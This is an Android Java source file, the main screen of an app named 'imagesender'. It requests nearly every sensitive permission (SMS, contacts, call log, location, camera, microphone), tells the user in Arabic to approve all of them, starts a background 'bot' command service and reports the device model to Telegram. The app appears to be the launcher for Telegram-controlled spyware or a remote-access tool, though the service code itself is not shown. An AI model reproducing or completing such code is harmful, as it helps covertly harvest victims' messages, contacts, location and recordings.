package com.dotbhai.imagesender;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final int PERM_REQ = 100;
    private final String[] PERMS = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_WIFI_STATE
    };

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 50, 50, 50);

        TextView tv = new TextView(this);
        tv.setText("اضغط الزر بالأسفل لتشغيل البوت.\nتأكد من الموافقة على جميع الأذونات.");
        tv.setTextSize(16);
        layout.addView(tv);

        Button btnStart = new Button(this);
        btnStart.setText("تشغيل البوت");
        layout.addView(btnStart);

        setContentView(layout);

        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(PERMS, PERM_REQ);
        }

        btnStart.setOnClickListener(v -> {
            try {
                Intent serviceIntent = new Intent(this, BotCommandService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }
                
                TelegramSender.sendMessage("🚀 <b>التطبيق جاهز</b>\n" + Build.MODEL + "\nأرسل /start");
                Toast.makeText(this, "تم التشغيل! روح لتلجرام وأرسل /start", Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                Toast.makeText(this, "خطأ: " + e.getMessage(), Toast.LENGTH_LONG).show();
            }
        });
    }
}